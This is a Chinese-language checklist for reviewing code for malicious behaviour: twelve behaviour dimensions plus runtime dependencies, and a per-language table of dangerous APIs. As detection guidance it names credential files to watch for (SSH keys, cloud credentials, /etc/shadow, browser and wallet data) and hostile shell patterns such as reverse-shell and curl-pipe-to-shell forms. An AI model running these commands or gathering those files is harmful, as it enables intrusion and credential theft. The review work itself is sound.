# 行为维度与危险 API 速查

12 个行为维度,逐条给结论(是 / 否 / 不适用),命中要带 `文件:行号` 证据。报告里只写核实过的,扫描器的候选点先复核再落笔。副作用与残留在这里排第 2 项,运行时依赖单列一节(第 13 项)。

## 1. 读取(Read)

- 读了哪些路径?是本工具自己的输入,还是**遍历**用户目录 / 磁盘 / 环境?
- 是否触碰敏感路径:见下面第 8 项的清单。
- 读取是**一次性**还是**持续监控**(`watchdog`、`inotify`、定时轮询、文件系统 hook)?
- 有没有把读到的内容写进日志或缓存(等于换了地方留存隐私)?

## 2. 写入与删除(副作用)

这一项直接决定"有没有副作用、能不能判 L0",逐条答清:

- **写到哪里**:自身工作目录、脚本所在目录、用户主目录(`~/.config`、`~/.cache`)、系统目录,还是别处?给具体路径或默认值。
- **产生什么**:数据文件、缓存、配置文件、日志、锁 / PID 文件、编译产物 —— 逐个列出,别合并成一句"写文件"。
- 是新建,还是**覆盖 / 删除已有文件**?删除目标是否可能是用户数据?有没有先备份?
- **退出后是否清掉**:正常退出与异常退出两种情况分别怎么处理?临时文件、锁文件、半成品会不会留下?
- 是否修改 shell 启动文件、`PATH`、hosts、代理设置、证书库?
- 是否有清空或截断行为(日志、历史记录、浏览器数据)?

判断技巧:先找所有会创建文件的调用,再顺着路径变量回追它拼在哪(当前目录 / 用户目录 / 系统目录);路径来自参数或配置时,记下默认值。

## 3. 网络(Network)

- 出站还是入站?是否监听端口(对外提供服务)?
- 协议与目的地:HTTPS?明文 HTTP?固定 IP?域名?地址是**硬编码**还是用户可配?
- 传的是什么(见"数据流追踪"),有没有 TLS / 签名 / 加密?
- 是否保持长连接 / 心跳 / WebSocket / 轮询,是否可被外部下发指令?
- 是否有 DNS 外带、ICMP 隧道、原始 socket、非标准端口这些**规避形态**?

## 4. 执行(Execute)

- 起子进程 / shell:`os.system`、`subprocess`、`child_process`、`shell_exec`、`os.execute`。
- 动态执行代码:`eval`、`exec`、`new Function`、`loadstring`、`Invoke-Expression`、`assert()`(PHP)。
- 加载外部二进制:`ctypes` / `CDLL`、`Add-Type`、`dlopen`、从内存映射执行(无文件)。
- 命令拼接是否来自外部输入(命令注入面)。
- 执行的东西是**随包带的**还是**从网络取来的**?后者性质完全不同。

## 5. 持久化(Persistence)

- 计划任务:cron / `crontab`、`schtasks`、`at`、systemd timer。
- 自启:注册表 `Run`、启动文件夹、`systemd enable`、`rc.local`、`init.d`、`LaunchAgents` / `LaunchDaemons`。
- 改 profile:`~/.bashrc`、`~/.zshrc`、PowerShell profile、`~/.config/autostart`。
- 是否安装为服务 / 守护进程、开机静默运行。

## 6. 提权与系统改动(Privilege)

- `sudo`、`doas`、`runas`、`pkexec`、UAC 提权(`ShellExecute runas`)、`setuid`。
- 改系统配置:防火墙、SELinux、系统代理、路由、`/etc/hosts`、iptables。
- 关闭安全机制:停杀软 / Defender、关审计、改 `SeDebugPrivilege`。
- 是否要求远超功能所需的权限(一个计算器要管理员权)。

## 7. 隐私采集(Collect)

- 键盘:`pynput` / `keyboard`、`SetWindowsHookEx`、`GetAsyncKeyState`。
- 剪贴板:`pyperclip`、`win32clipboard`、`pbpaste` / `xclip`、`clipboard.readText`。
- 屏幕:`ImageGrab`、`mss`、`pyautogui.screenshot`、`screencapture`、`GetDC`。
- 音视频:`cv2.VideoCapture`、`pyaudio`、`getUserMedia`、`MediaRecorder`。
- 位置与身份:`navigator.geolocation`、IP 归属查询、`machine-id`、MAC、SSID、硬件指纹。

## 8. 凭据访问(Credential)

高价值目标清单:

- `~/.ssh/id_rsa`、`id_ed25519`、`known_hosts`
- `~/.aws/credentials`、`~/.aws/config`、`~/.kube/config`、`~/.docker/config.json`
- `~/.netrc`、`~/.git-credentials`、`~/.npmrc`、`~/.pypirc`
- 浏览器:`Login Data`、`Cookies`、`Web Data`、`Local State`、`key[34].db`、`logins.json`
- 钱包:`wallet.dat`、`keystore`、MetaMask / Exodus / Electrum 数据目录
- 环境变量里带 `KEY` / `TOKEN` / `SECRET` / `PASS` 的值
- 系统:`/etc/shadow`、`/etc/passwd`、`/proc/*/environ`、keychain

只要是**成批收集**凭据类文件,即使还没发出去,也按 L2 顶格并在报告里加粗提示。

## 9. 破坏与加密(Destroy / Crypto)

- 批量加密文件 + 写勒索说明 + 删卷影(`vssadmin delete shadows`)→ 勒索。
- 覆写 / 格式化 / `dd if=/dev/urandom` / `shred` → 破坏。
- 加密用于**自身数据保护**(加密自己的配置、加密通信)是正常功能,别误判;看加密的**对象**是不是用户文件。

## 10. 反分析(Anti-analysis)

- 混淆 / 加壳:`eval` 套娃、`atob`、`fromCharCode`、大块 base64、`marshal.loads`、`zlib.decompress`。
- 动态取码:从 URL / 注册表 / 剪贴板 / 图床拉后续载荷。
- 反调试:ptrace、`IsDebuggerPresent`、检测父进程。
- 反虚拟机:`VMware`、`VirtualBox`、`qemu`、`/sys/class/dmi`、检测分析工具进程。
- 反杀软:枚举安全软件进程 / 服务、检测沙箱用户名或路径。
- 延迟与随机:启动后 `sleep` 很久、只在特定时间或条件下触发。
- 抹痕迹:清历史、清事件日志、删除自身。

以上任一条出现,正常工具解释不通,**至少上调一级**。

## 11. 依赖与供应链(Supply chain)

- `package.json` 的 `preinstall` / `postinstall`,`setup.py` 的任意代码执行,`Makefile` 里的下载。
- `curl … | sh`、`wget … | bash`、`Invoke-WebRequest | IEX`。
- 从 URL 拉二进制再 `chmod +x` 执行;从非官方源装依赖(`--index-url`、明文 HTTP 源)。
- 依赖未锁版本、依赖名疑似抢注(typosquatting)。
- 构建 / CI 脚本里带凭据提交、拉取私有仓库。

## 12. 权限与范围(Scope)

- 申请的权限是否超出功能所需(读通讯录只为了显示头像)。
- 可访问的数据范围:单文件 / 单目录 / 整个主目录 / 整个磁盘。
- 能否被外部输入影响(配置、环境变量、参数由谁控制)。

## 13. 运行时依赖(Requirements)

副作用之外必须给出的另一张清单 —— 它决定"换台机器还能不能跑":

- **语言与版本**:Python 3.10+ / Node 18+ / PHP 8.1+;代码里有没有版本判断(`sys.version_info`、`process.version`)。
- **第三方库**:先从 `requirements.txt` / `package.json` / `Pipfile` / `composer.json` / `go.mod` / `Gemfile` 等清单读;没有清单就从 `import` / `require` 反推。注意区分标准库与第三方。
- **必须存在的系统命令**:`ffmpeg`、`ffprobe`、`git`、`curl`、`crontab`、`tar`……缺了通常直接起不来或功能失效。
- **环境变量与凭据**:需要 `API_KEY`、`DATABASE_URL` 之类;有没有默认值?没有时是报错退出还是静默降级?
- **平台限制**:只在 Windows / Linux / macOS 之一能跑?需要 GUI、桌面会话、root / 管理员权限?
- **外部服务**:必须联网才能用?连哪个域名?需要账号或 token?
- **硬件与设备**:摄像头、麦克风、GPU、串口、特定型号。
- **安装阶段的副作用**:`postinstall`、`setup.py`、`Makefile` 在**安装时**就会执行代码、下载文件、拉依赖 —— 这部分副作用发生在"装的时候",不只是"跑的时候"。

报告里列成表:`依赖 | 类型 | 是否必需 | 缺了会怎样`。

## 各语言危险 API 速查

| 类别 | Python | JavaScript / TypeScript | PHP | Lua |
| --- | --- | --- | --- | --- |
| 执行命令 | `os.system` `os.popen` `subprocess.*` `pty.spawn` | `child_process` `execSync` `spawn` | `system` `exec` `shell_exec` `passthru` `proc_open` `popen` | `os.execute` `io.popen` |
| 动态执行 | `eval` `exec` `compile` `__import__` `marshal.loads` | `eval` `new Function` `vm.runIn*` `setTimeout("...")` | `eval` `assert` `create_function` `preg_replace /e` `call_user_func` | `loadstring` `load` `dofile` |
| 网络 | `requests` `urllib` `http.client` `socket` `smtplib` `paramiko` | `fetch` `axios` `XMLHttpRequest` `http.request` `net.connect` `WebSocket` | `curl_*` `file_get_contents("http...")` `fsockopen` `stream_socket_client` | `socket.*` `http.request` `ngx.socket` |
| 原生/底层 | `ctypes` `CDLL` `windll` `mmap` | `ffi-napi`、原生插件 | `dl()`、扩展 `.so` | `ffi`、`package.loadlib` |
| 编码解码 | `base64.b64decode` `codecs.decode` `binascii` | `atob` `Buffer.from(x,'base64')` `String.fromCharCode` | `base64_decode` `gzuncompress` `gzinflate` | `mime.unb64` `string.char` |
| 加密 | `cryptography` `Fernet` `pycryptodome` `hashlib` | `crypto.createCipheriv` `SubtleCrypto` | `openssl_encrypt` `mcrypt_*` `hash` | `resty.aes`、`openssl` 绑定 |
| 文件 | `open(...,'w')` `shutil` `os.remove` `pathlib` | `fs.writeFile` `fs.unlink` `createWriteStream` | `file_put_contents` `fwrite` `unlink` `rename` | `io.open` `os.remove` `os.rename` |

Shell / PowerShell 重点:

- `curl|sh`、`wget|bash`、`nc -e`、`socat exec`、`bash -i >& /dev/tcp/<ip>/<port>`
- `Invoke-Expression`(`IEX`)、`-EncodedCommand` / `-enc`、`FromBase64String`、`DownloadString`、`Add-Type`

## 复核要点(避免误报)

扫描器命中后先分清三类,再决定要不要写进报告:

- **真会执行**:在代码路径上,参数可控。
- **只是提到**:字符串常量、注释、文档、示例代码、正则本身。
- **间接**:通过变量、配置、反射调用间接完成,需要顺着追。
